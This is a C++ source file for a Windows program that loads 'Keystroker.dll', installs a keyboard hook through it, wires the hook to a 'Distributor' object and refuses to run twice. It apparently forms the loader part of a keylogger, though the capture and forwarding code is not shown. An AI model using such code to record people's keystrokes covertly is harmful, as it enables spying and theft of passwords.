#include "Application.h"

Application::Application(std::string const& appliPath)
	: _appliPath(appliPath)
{
	_hookBuilder = NULL;
	_hookDeleter = NULL;
	_appliPathSetter = NULL;
}

Application::~Application()
{
	if (_hookBuilder && _hookDeleter)
		_hookDeleter();
}

void Application::init(void)
{
	try {
		if (Application::Existing()) {
			throw (std::runtime_error("Application already launched"));
		}

		StaticTools::CreateFolder(StaticTools::GetProjectResourceDirectory());

		_distributor = std::make_shared<Distributor>();
		_distributor->init();

		_dllHandler.loadLibrary("Keystroker.dll");
		_hookBuilder = (KBHookBuilder)_dllHandler.getSymbolAddr("CreateKeyboardHook");
		_hookDeleter = (KBHookDeleter)_dllHandler.getSymbolAddr("DeleteKeyboardHook");
		_appliPathSetter = (AppliPathSetter)_dllHandler.getSymbolAddr("SetApplicationPath");
		_distriSetter = (DistributorSetter)_dllHandler.getSymbolAddr("SetDistributor");
		
		_appliPathSetter(_appliPath);
		_distriSetter(_distributor);
		_hookBuilder();
	}
	catch (std::exception const& e) {
		throw (e);
	}
}

void Application::loop(void)
{
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}

void Application::close(void)
{
	_distributor->destroy();
	if (_hookDeleter) {
		_hookDeleter();
	}
}

bool Application::Existing(void)
{
	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);
	if (Process32First(snap, &process)) {
		while (Process32Next(snap, &process))
		{
			if (strcmp(process.szExeFile, APP_NAME) == 0
				&& process.th32ProcessID != GetCurrentProcessId()) {
				CloseHandle(snap);
				return (true);
			}
		} 
	}
	CloseHandle(snap);
	return (false);
}